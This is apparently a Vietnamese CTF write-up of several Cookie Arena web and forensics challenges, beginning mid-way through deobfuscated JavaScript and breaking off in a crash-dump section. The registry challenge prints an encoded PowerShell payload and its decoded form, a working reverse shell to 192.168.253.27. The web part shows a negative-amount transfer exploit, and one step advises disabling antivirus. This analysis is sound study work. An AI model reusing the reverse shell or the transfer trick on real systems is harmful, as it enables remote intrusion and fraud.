_0x56ba08(_0x3befa3,_0x4e1ffd,_0x21938f,_0x7fec01){return _0x50c7(_0x3befa3-0x271,_0x7fec01);}var _0x24b3ab=(function(){var _0x4f136a={};_0x4f136a[_0x40d327(0x3e6,0x3cd,0x3d7,0x3e8)]=function(_0x23d217,_0x1f8a53){return _0x23d217===_0x1f8a53;};function _0x40d327(_0x1196ca,_0x23db5a,_0x45c200,_0x5628e5){return _0xea2690(_0x23db5a,_0x23db5a-0x93,_0x45c200-0x2c,_0x45c200- -0x53);}_0x4f136a['zaGfR']=_0x890fcf[_0x40d327(0x3cb,0x3cf,0x3d2,0x3e4)];function _0x346564(_0x2de998,_0x3be0c5,_0x38e73c,_0x396547){return _0x56ba08(_0x3be0c5- -0x5a1,_0x3be0c5-0x10b,_0x38e73c-0x1,_0x38e73c);}_0x4f136a['TwJZl']='KrqBM';var _0x951797=_0x4f136a,_0x140877=!![];return function(_0x36bc46,_0x3c9734){function _0x1fc640(_0x1f0d5e,_0x1228ed,_0x1fd042,_0x5dd4ec){return _0x346564(_0x1f0d5e-0x8f,_0x5dd4ec-0x5e,_0x1228ed,_0x5dd4ec-0x14c);}function _0x29cafd(_0x33836c,_0x3d7506,_0x3165d1,_0x4ce102){return _0x40d327(_0x33836c-0x1d,_0x3d7506,_0x33836c- -0x105,_0x4ce102-0xf6);}if(_0x951797['eUoGg'](_0x951797[_0x1fc640(-0x1d5,-0x1d0,-0x1df,-0x1e6)],_0x951797[_0x29cafd(0x2d6,0x2c5,0x2df,0x2cf)])){var _0x33e487=_0x46e645['apply'](_0x47201f,arguments);return _0x2b5775=null,_0x33e487;}else{var _0x54cdd4=_0x140877?function(){function _0x1e785(_0x510980,_0x3d2d47,_0x5bf169,_0x37623){return _0x1fc640(_0x510980-0x174,_0x37623,_0x5bf169-0x3f,_0x5bf169-0x5c9);}if(_0x3c9734){var _0x505e3b=_0x3c9734[_0x1e785(0x3d1,0x3b6,0x3c9,0x3d1)](_0x36bc46,arguments);return _0x3c9734=null,_0x505e3b;}}:function(){};return _0x140877=![],_0x54cdd4;}};}()),_0x34b2c2=_0x890fcf['PNJnP'](_0x24b3ab,this,function(){function _0x590bcc(_0x512482,_0x7ce841,_0x4ca8c5,_0x203b62){return _0x56ba08(_0x7ce841- -0x328,_0x7ce841-0x1b3,_0x4ca8c5-0x14a,_0x4ca8c5);}function _0x89be1a(_0x13c474,_0x5864d5,_0x5acfe7,_0x3cdda4){return _0x56ba08(_0x3cdda4- -0x45a,_0x5864d5-0x85,_0x5acfe7-0x1f1,_0x13c474);}return _0x34b2c2[_0x590bcc(0x16,0x1d,0x13,0x18)]()['search'](_0x890fcf['WuJfd'])[_0x89be1a(-0x103,-0x115,-0xff,-0x115)]()[_0x590bcc(0x28,0x2d,0x33,0x1b)+'r'](_0x34b2c2)[_0x89be1a(-0x10d,-0x10c,-0xf0,-0xfa)](_0x890fcf[_0x590bcc(0x43,0x30,0x24,0x25)]);});_0x890fcf[_0xea2690(0x420,0x413,0x415,0x426)](_0x34b2c2);function _0x2e3fc4(_0x230fda,_0x10a57a){function _0x2b814b(_0x403f5b,_0x2eb703,_0x59f60d,_0x4dfb88){return _0xea2690(_0x4dfb88,_0x2eb703-0x92,_0x59f60d-0xfc,_0x59f60d- -0x1da);}function _0x24ebc4(_0x4530cb,_0x558a82,_0x4da7f7,_0x269984){return _0xea2690(_0x269984,_0x558a82-0x6,_0x4da7f7-0x1d0,_0x4da7f7- -0xa1);}if(_0x890fcf['XIkzW'](_0x890fcf[_0x24ebc4(0x39e,0x396,0x38c,0x381)],_0x890fcf[_0x2b814b(0x26f,0x24d,0x25a,0x25e)])){var _0x2c3e6f=_0x4004c5?function(){function _0x2c809c(_0xd50cea,_0x2ec578,_0x2f0769,_0x12fe45){return _0x24ebc4(_0xd50cea-0x1bc,_0x2ec578-0x134,_0x2f0769- -0x3a3,_0x2ec578);}if(_0x23acf2){var _0x3e799f=_0x230dff[_0x2c809c(-0x42,-0x24,-0x35,-0x2e)](_0x4f44af,arguments);return _0x597eff=null,_0x3e799f;}}:function(){};return _0x3eebc4=![],_0x2c3e6f;}else{var _0x3c12b2=CryptoJS[_0x24ebc4(0x373,0x364,0x377,0x389)]['Utf8']['parse'](_0x890fcf['Gmpce'](_0x10a57a,_0x890fcf[_0x24ebc4(0x37e,0x37e,0x374,0x375)])),_0x329fea=CryptoJS['AES'][_0x2b814b(0x235,0x257,0x246,0x243)](_0x230fda,_0x3c12b2,{'iv':_0x3c12b2});return _0x329fea[_0x2b814b(0x228,0x248,0x237,0x224)](CryptoJS[_0x24ebc4(0x365,0x37a,0x377,0x37d)][_0x24ebc4(0x37e,0x376,0x36c,0x368)]);}}const _0x5f2a9b=_0x890fcf[_0xea2690(0x427,0x423,0x425,0x435)];var _0x5df765=document[_0xea2690(0x42f,0x42f,0x422,0x430)+_0x56ba08(0x366,0x376,0x37a,0x36b)](_0x5f2a9b);_0x5df765=Array[_0xea2690(0x436,0x426,0x444,0x42f)](_0x5df765);var _0x46d3cf=_0x5df765[_0xea2690(0x42e,0x421,0x419,0x42b)](_0x2ffa3f=>_0x2ffa3f[_0x56ba08(0x356,0x36b,0x344,0x35a)+'te'](_0xea2690(0x425,0x428,0x401,0x416)+'src'));_0x46d3cf=_0x46d3cf[_0xea2690(0x433,0x43d,0x42e,0x42b)](_0x294fdc=>CryptoJS[_0xea2690(0x410,0x414,0x407,0x41c)][_0xea2690(0x42c,0x410,0x41b,0x420)](_0x294fdc,_0x56ba08(0x365,0x35e,0x353,0x354)+_0x56ba08(0x34b,0x34d,0x352,0x361))['toString'](CryptoJS[_0x56ba08(0x34c,0x357,0x336,0x336)]['Utf8']));function _0xea2690(_0xee59d9,_0x4e2848,_0x3a758b,_0x42c81e){return _0x50c7(_0x42c81e-0x33d,_0xee59d9);}_0x5df765[_0x56ba08(0x34e,0x33b,0x352,0x346)]((_0x3ae067,_0x18596f)=>(_0x3ae067[_0xea2690(0x427,0x414,0x40f,0x41d)+_0x56ba08(0x348,0x341,0x35d,0x34e)](_0xea2690(0x406,0x40d,0x409,0x416)+'src'),_0x3ae067['setAttribu'+'te']('src',_0x46d3cf[_0x18596f])));}());
```
Đoạn mã này là Javascript đã bị obfuscated. Công cụ có thể deobfuscate có rất nhiều  bạn có thể google nhé. Mình sau khi deofuscated thì được đoạn mã ngắn gọn và dễ nhìn hơn sau: ⚓
```js
;(async function main() {
  var _0x24b3ab = (function () {
      var _0x140877 = true
      return function (_0x36bc46, _0x3c9734) {
        var _0x54cdd4 = _0x140877
          ? function () {
              if (_0x3c9734) {
                var _0x505e3b = _0x3c9734.apply(_0x36bc46, arguments)
                return (_0x3c9734 = null), _0x505e3b
              }
            }
          : function () {}
        return (_0x140877 = false), _0x54cdd4
      }
    })(),
    _0x34b2c2 = _0x24b3ab(this, function () {
      return _0x34b2c2
        .toString()
        .search('(((.+)+)+)+$')
        .toString()
        .constructor(_0x34b2c2)
        .search('(((.+)+)+)+$')
    })
  _0x34b2c2()
  function _0x2e3fc4(_0x230fda, _0x10a57a) {
    var _0x3c12b2 = CryptoJS.enc.Utf8.parse(_0x10a57a || 'c00kie-ar3na-ctf'),
      _0x329fea = CryptoJS.AES.decrypt(_0x230fda, _0x3c12b2, { iv: _0x3c12b2 })
    return _0x329fea.toString(CryptoJS.enc.Utf8)
  }
  const _0x5f2a9b = '#chapter-content img'
  var _0x5df765 = document.querySelectorAll(_0x5f2a9b)
  _0x5df765 = Array.from(_0x5df765)
  var _0x46d3cf = _0x5df765.map((_0x2ffa3f) =>
    _0x2ffa3f.getAttribute('encrypted-src')
  )
  _0x46d3cf = _0x46d3cf.map((_0x294fdc) =>
    CryptoJS.AES.decrypt(_0x294fdc, 'bánh quy chấm sữa').toString(
      CryptoJS.enc.Utf8
    )
  )
  _0x5df765.forEach(
    (_0x3ae067, _0x18596f) => (
      _0x3ae067.removeAttribute('encrypted-src'),
      _0x3ae067.setAttribute('src', _0x46d3cf[_0x18596f])
    )
  )
})()
```

Chức năng chính của đoạn mã trên như sau:
* Mình tập trung vào hàm Crypto `_0x2e3fc4` hàm này nhận hai đối số `_0x230fda` và `_0x10a57a`. Và thực hiện chức năng giải mã bằng thuật toadn AES và khóa `_0x10a57` nếu không được cung cấp sẽ sử dụng khóa mặc định là `c00kie-ar3na-ctf`. Kết qảu được trả về ở dạng chuỗi UTF-8 nhé. 🐤
* Sau đó, đoạn mã tiếp tục bằng việc chọn tất cả các phần tử `<img>` trong document hiện tại với `#chapter-content img`
* Tiếp theo, lấy giá trị trong thuộc tính `source-src` của mỗi ảnh và thực hiện giải mã AES với khóa là `bánh quy chấm sữa` 🍪
  
  ![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/e3e387f4-a5b8-4282-834e-d86b876c4a4d)

  Mình có mô phỏng lại cách làm việc này bằng công cụ online sau:
  
  ![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/d5aeef6a-630e-47a7-bdaa-4748d125975d)
  Ồ hóa ra đó là đường dẫn tới file ảnh đó trong server. `bánh quy chấm sữa` là decrypt key mà ta cần tìm.

Đến đây thì mình thấy, chall có thể phát triển thêm để hay hơn. Nhưng chỉ cần put decrypt key là `bánh quy chấm sữa` vào `FLAG` là ta sẽ lấy được lá cờ.

Flag: `CHH{jAvAscRIP7_o8FuSCaTe_70326fd1bd98e39c43dc97faac2a594f}`

## Be Positive
### Mô tả
```
Libra Dnuf Marketplace

Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob.

After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal.

To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state.

Format Flag: CHH{XXX} Nếu xuất hiện Fake Flag hãy nhấn nút Rollback trong Challenge và thực hiện test lại.
```

### Phân tích
* Giao diện được cung cấp khá đơn giản. 🥠

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/c3f6f2be-3786-4f12-a406-84391b9ba95b)

Cơ bản thì chall cung cấp cho chúng ta 2 tài khoản: 
Account `alice` có password `alice`.
Account `bob` có password `bob`.

* Giao diện sau khi đăng nhập
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/e174d360-6168-4b9f-97a4-6c50730b85c8)

 - Chức năng `Market`: hiển thị danh sách các vậy có thể mua, bao gồm cả flag và cả số dư liệu tại. Đây là một chall FLAG Shop 🈲
 - Chức năng: `Tranfer`: cho phép chuyển tiền giữa các tài khoản.
   
   ![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/d6a03ed3-69d8-4cfe-ab24-301850a9f59a)
- Chức năng `Rollback`: dùng để reset lại challenge.

Chúng ta cần có 3001$ để mua flag. Trong khi tài khoản chỉ `alice` và cả `bob` chỉ có tổng cộng 3000$. Hmmmm . 
Sau khi rà hết những lỗ hổng có khả năng như `cmdi và sqli` mình không nhận được kết quả khả thi nào cả.
Đa số dạng đề này Ý tưởng là làm sao bypass được chức năng `Tranfer` làm thay đổi số dư hiện tại. 

Đây là một giao dịch thành công.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/5c030f43-a600-4872-b4f2-a46e0d1cf218)

### Solution
Tưởng tượng cách làm việc của hàm `Tranfer` như sau:
nó sẽ lấy số dư hiện tại trừ cho giá trị `amount` để cập nhật số dư. Vậy nế nếu `amount` là một giá trị âm thì sao. Khi đó phép tính trừ sẽ chuyển thành cộng làm tăng số dư.

Điều này tạo ra một giao dịch thành công.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/1c6e9343-4db8-4b6d-affd-dbec17ee32fd)

Kiểm tra số dư trong tài khoản của `alice` mình thấy số dư đã được tăng lên thành công. 🚡

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/63727f5d-80df-4fb0-980d-dddc03c824a9)

Mua flag và mình nhận được flag. Chú ý nếu nhận được fake flag hãy thực hiện `Rollback` và thực hiện khai thác lại nhé.

Flag: `CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_d0b21424951572b39362d8414c0fb18b}`


# Forensic chanllenge
Tiếp theo là một số thử thách về Forensic mình giải được nhé. ☣️ Mình không có nhiều kinh nghiệm forensic và các mảng khác nên các bài này mình sẽ làm dựa trên google và những gì mình thôi nhé vì đây là CTF cá nhân nên cần càng nhiều point càng tốt 🔯. Hy vọng không bị bắt bẻ. Mình chỉ muốn học hỏi thêm để lỡ sau va chạm thực tế có thể sẽ gặp phải còn đỡ bỡ ngỡ. Một phần cũng muốn chứng minh mình đã cố gắng giải các thử thách này trong quá trình diễn ra CTF. 
Một phần thì, các thử thách của anh `BQUAMAN` thực sự rất hay. 👩‍❤️‍👩 Quá đã  ~~~ 🌶️

## Tin học văn phòng cơ bản
### Mô tả
```
Sau khi tham gia một khóa Tin học văn phòng cơ bản, Hòa đã có thể tự tạo một tệp tài liệu độc hại và anh ta có ý định sẽ dùng nó để hack cả thế giới

Tải challenge: https://drive.google.com/file/d/1WrLFE5qA-qJ6iLEQYQqCo0Xb99Yz8mTH/view?usp=drive_link (pass: cookiehanhoan)

Format FLAG: CHH{XXX}
```
Nếu bạn không tìm thấy file trong drive nữa thì có thể tìm thấy [tại đây](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/Cookie%20Arena%202/source/arenas2-forensics-tin-hoc-van-phong-co-ban.zip)
### Phân tích
Sau khi giải nén file zip được cung cấp mình nhận được file .doc như vậy này.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/4188d31c-f665-402d-ba4e-8ad7f6a5f47b)
`Author: Long Nguyen` 😄

### Solution
Mình từng làm một số bài liên quan tới file doc, xls như này. Có một công cụ tên là `olevba`. Dùng để phân tích các file `.doc, .dot, .docm, .dotm, .xml, .mht, .xls, .xlsm, .xlsb, .pptm, .ppsm, VBA/VBScript source`
```
olevba là tập lệnh để phân tích các tệp OLE và OpenXML, chẳng hạn như tài liệu MS Office (ví dụ: Word, Excel), để phát hiện Macro VBA , trích xuất mã nguồn của chúng ở dạng văn bản rõ ràng và phát hiện các mẫu liên quan đến bảo mật như macro tự động thực thi , VBA đáng ngờ các từ khóa được sử dụng bởi phần mềm độc hại.
```
Sử dụng tools này nhanh như sau:
Run các lệnh sau trong thư mục chứa file `doc`
```
docker pull cincan/oletools
docker run -v "$(pwd):/samples" cincan/oletools olevba /samples/Challenge.doc
```
Và mình thấy flag ở trong MsgBox luôn:

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/baf2355a-7b29-4a96-854d-af2e5a3269a7)

Flag: `CHH{If_u_w4nt_1_will_aft3rnull_u}`

## Sổ đăng ký
### Mô tả
```
Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack.

Tải challenge: https://drive.google.com/file/d/1pShye_YtnUuIObPdnq9PeiIge0Oelsix/view?usp=drive_link (pass: cookiehanhoan)

Format Flag: CHH{XXX}
```
Nếu bạn không tìm thấy file trong drive nữa thì có thể tìm thấy [tại đây](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/Cookie%20Arena%202/source/arenas2-forensics-so-dang-ki%20(1).zip)

### Phân tích
Sau khi tải và giải nén thì mình nhận được file như sau

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/c36c95d7-6bbc-4385-918e-10f688beaabb)

Theo mình tìm hiểu, thì file `NTUSER.DAT` là một tệp tin định dạng registry của hệ điều hành MS Windows. Tệp tin này chứa cơ sở dữ liệu registry của một người dùng cụ thể trên hệ thống. Lưu trữ thông tin cấu hình, cài đặt và các thiết lập của hệ thống và ứng dụng.

Mình có biết một công cụ tên là `regripper`. Dùng để trích xuất thông tin từ các tệp có định dạng Registry thông qua các plugin Perl.
Cài đặt: `sudo apt install regripper`
tham khảo: https://www.kali.org/tools/regripper

Dựa vào mô tả thì mình đoán, file này có Persistent rồi. Và liên tưởng đầu tien của mình là `Software\Microsoft\Windows\CurrentVersion\Run` 😄 mình sẽ kiểm tra chỗ đó. Có một chall trên Hackthebox giống giống như này. 

### Solution
Chạy lệnh: 
`sudo regripper -r NTUSER.DAT -a` 

Với `-a` hoặc `-aT` nhé. Để tự động run các plugins.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/61d1be56-8239-4e96-a6fc-7230e2d940b8)

Kết quả đúng như mình đoán, có một đoạn mã được thực thi ở đây, trông rất khả nghi:

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/53dcbfea-c90b-4994-9cc2-b92f18ed3c19)

Đoạn mã này gồm:
```
(neW-obJEct io.COMprEssIon.dEFlATesTReAm( [sySTem.IO.memorYSTREam] [coNVeRT]::FRoMBAse64stRInG( 'TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='), [SYSTEM.iO.ComPReSSion.CoMPrEsSIonmODe]::DeCOmpresS)|FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()|inVOKe-exprEsSIon
```
Mình tìm hiểu một lúc: đoạn mã thực hiện giải mã một chuỗi ở định dạng base64 và nén bằng thuật toán Deflate.

😄 Đến đây hơi khó khăn nhưng dựa vào các từ khóa thì mình đã tìm ra cách decode tại bài viết này: [Decode payload powershell](https://github.com/jas502n/Powshell-decode-payload)

Hãy tắt hết tường lửa , phần mềm diệt virus để không có lỗi đỏ nhé.
Tách lấy phần base64 và Chạy lệnh sau trong powershell:
```
PS C:\Windows\system32> sal a New-Object;(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TVFva4JAGP8qh7hxx/IwzbaSBZtsKwiLGexFhJg+pMs09AmL6rvP03S9uoe739/nZD+OIEHySmwolNn6F3wkzilH2HEbkDupvwXM+cKaWxWSSt2Bxrv9F64ZOteepU5vYOjMlHPMwNuVQnItyb8AneqOMnO5PiEsVytZnHkJUjnvG4ZuXB7O6tUswigGSuVI0Gsh/g1eQGt8h6gdUo98CskGQ8aIkgBR2dmUAw+9kkfvCiiL0x5sbwdNlQUckb851mTykfhpECUbdstXjo2LMIlEE0iCtedvhWgER1I7aKPHLrmQ2QGVmkbuoFoVvOE9Eckaj8+26vbcTeomqptjL3OLUM/0q1Q+030RMD73MBTYEZFuSmUMYbpEERduSVfDYZW8SvwuktJ/33bx/CeLEGirU7Zp52ZpLfYzPuQhZVez+SsrTnOg7A8='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()
```

Kết quả:
```
$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "CHH{N0_4_go_n0_st4r_wh3r3}" + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Flag: `CHH{N0_4_go_n0_st4r_wh3r3}`   😙 Quá đã 🌶️

Mình có biết một công cụ để phân tích dạng file này là `volability`. Mình sẽ sử dụng version 2 cho dễ làm việc. version 3 mình chưa dùng.
Chạy các lệnh sau trong thư mục có chứa file `NTUSER.DAT`
```
docker pull phocean/volatility
docker run --rm --user=$(id -u):$(id -g) -v "$(pwd)":/dumps:ro,Z -ti phocean/volatility -f /dumps/NTUSER.DAT -h
```

## Trivial FTP
### Mô tả
```
Việc những nhân viên của một công ty X sử dụng các giao thức không an toàn để kết nối và truyền tải tập tin từ xa đã tạo cơ hội cho những kẻ tấn công Man in the Middle và đánh cắp dữ liệu quan trọng của công ty

Tải Challenge: https://drive.google.com/file/d/1AqsNR8eKe527iZJf1koNRs1pl9YhK0Ev/view?usp=drive_link (pass: cookiehanhoan)

Format FLAG: CHH{XXX}
```
Nếu bạn không tìm thấy file trong drive nữa thì có thể tìm thấy [tại đây](https://github.com/TaiPhung217/CTF_writeup/blob/main/2023/Cookie%20Arena%202/source/arenas2-forensics-trivialFTP.zip)

### Phân tích
Mình được cung cấp một file `TrivialFTP.pcapng`. 
Mở bằng Wireshark xem có gì không. Ặc 😥 file lớn vậy

Đề bài gợi ý là giao thức FTP nên mình có xem trong packet này thì thấy fiel flag.pdf đồng thời mình cũng thấy Tranfer type được sử dụng ở đây là netascii.

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/9c688ad4-85ce-43d3-9448-45b004a22552)

Sau một lúc bí bách mình sử dụng tool và extract ra được một file `flag.pdf version 1.5` NHưng không mở lên được 🥲

Mình có tìm hiểu chút thì `netascii` là một trong các kiểu truyền dữ liệu trong TFTP. Khi một yêu cầu truyền tệp tin được thực hiện với kiểu netascii, nó sẽ khác với định dạng ban đầu, nếu ta trích xuất file từ packet nó có thể khác đi. Dữ liệu trong tệp tin sẽ được truyền dưới dạng ASCII và tuân thủ một số quy tắc định sẵn.

```
Các quy tắc netascii bao gồm:
    Dữ liệu trong tệp tin chỉ bao gồm các ký tự ASCII từ 0 đến 127 (7-bit ASCII).
    Kết thúc dòng được đại diện bằng chuỗi "\r\n" (carriage return và line feed).
    Ký tự "\n" (line feed) không được sử dụng một mình mà phải được theo sau bởi ký tự "\r" (carriage return).
    Ký tự "\r" có thể được sử dụng một mình để đại diện cho một dòng trống (line feed).
```
`netascii` sẽ encode ký tự newline biểu diễn bằng CR+LF (Carriage Return + Line Feed) và Ký tự CR đơn: Ký tự CR đơn được biểu diễn bằng chuỗi CR+NUL (Carriage Return + Null).

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/9a9da9cc-3021-4da5-aa1c-f6cfce06af28)

Mình tham khảo tại đây [netascii.py](https://github.com/shylent/python-tx-tftp/blob/master/tftp/netascii.py) 

### Solution
Mở file `flag.pdf` decode ngược lại quy luật của netascii.

script python
```python
import os
import re

CR = b'\x0d'
LF = b'\x0a'
CRLF = CR + LF
NUL = b'\x00'
CRNUL = CR + NUL

# os.linesep is a byte string on Python 2 but a Unicode string on Python 3,
# but we always want a byte string.
if isinstance(os.linesep, bytes):
    NL = os.linesep
else:
    NL = os.linesep.encode("ascii")

re_from_netascii = re.compile(b'(\x0d\x0a|\x0d\x00)')

def _convert_from_netascii(match_obj):
    if match_obj.group(0) == CRLF:
        return NL
    elif match_obj.group(0) == CRNUL:
        return CR

def from_netascii(data):
    """Convert a netascii-encoded string into a string with platform-specific
    newlines.

    """
    return re_from_netascii.sub(_convert_from_netascii, data)

with open('flag.pdf', 'rb') as file:
        bytes = file.read()

decode = from_netascii(bytes)

with open('flag_decode.pdf', 'wb') as file:
        file.write(decode)
```

kết quả xuất ra một file `flag_decode.pdf`. 

Mình mở bằng trình đọc pdf onlien thì lấy được cờ. 

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/3c6f9bb2-8b46-423c-9127-602782d22fbb)

Flag: `CHH{FTP_4nd_TFTP_4r3_b0th_un$af3}`

Quá đã. mỗi ngày một kiến thức mới. 😙 🥰

tham khảo:
https://rainbowpigeon.me/posts/recovering-graphics-from-a-broken-pdf/
https://www.google.com/search?q=objects+in+pdf+CTF&sxsrf=AB5stBjrHCpPbYyR5Ocs8QTVFwAgMAd_-A%3A1688828937506&ei=CXypZO3AHpSBmgbJo7qQBg&ved=0ahUKEwit6Z-Hsv__AhWUgMYKHcmRDmIQ4dUDCBA&uact=5&oq=objects+in+pdf+CTF&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQA0oECEEYAFAAWABgtwFoAHABeACAAU-IAU-SAQExmAEAoAEBwAEB&sclient=gws-wiz-serp
https://www.mankier.com/1/mutool#Clean
https://www.google.com/search?q=mutool+pdf+ctf&oq=mutool+pdf+ctf&aqs=chrome..69i57.4400j0j9&sourceid=chrome&ie=UTF-8
https://silencemaydaycom.wordpress.com/2021/01/31/justcatthefish-2020/
https://zenn.dev/fiord/articles/da623cb6e9e868793388
https://ctftime.org/writeup/25847
https://inria.hal.science/hal-02082806/document
https://ctftime.org/writeup/16409

## Báo cáo dang dở
### Mô tả
```
Hòa đang làm báo cáo bài tập lớn để nộp cho thầy giáo thì bỗng nhiên máy tính của anh ấy bị tắt đột ngột do mất điện mà anh ấy thì chưa kịp lưu báo cáo một lần nào. Tuy nhiên sau đó, thay vì viết báo cáo mới thì Hòa đã chọn cách dành ra 4h đồng hồ để khôi phục báo cáo ban đầu từ tệp crash dump nhưng cuối cùng vẫn thất bại. Hòa thực sự đang cần trợ giúp.

Tải Challenge ở đây: https://drive.google.com/file/d/19OCHSjzHmzFBoSLYB90nkrZLnREpZ1nG/view?usp=drive_link (pass: cookiehanhoan)

Format Flag: CHH{XXX}
```
### Phân tích
Mình được cung cấp file như sau:
![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/3d356452-6ae7-45e7-b44f-ced1f7b73400)

Tìm hiểu một chút thì đây là một file crash dump trong hệ thống 

### Solution

### Solution
Trước hết mình cần biết profile. Mình sử dụng option `imageinfo`

![image](https://github.com/TaiPhung217/CTF_writeup/assets/102504154/f6cb78b6-7764-4387-9552-f9936886debb)

Hể chả có gì cả. Sau một hồi google thì mình thấy 




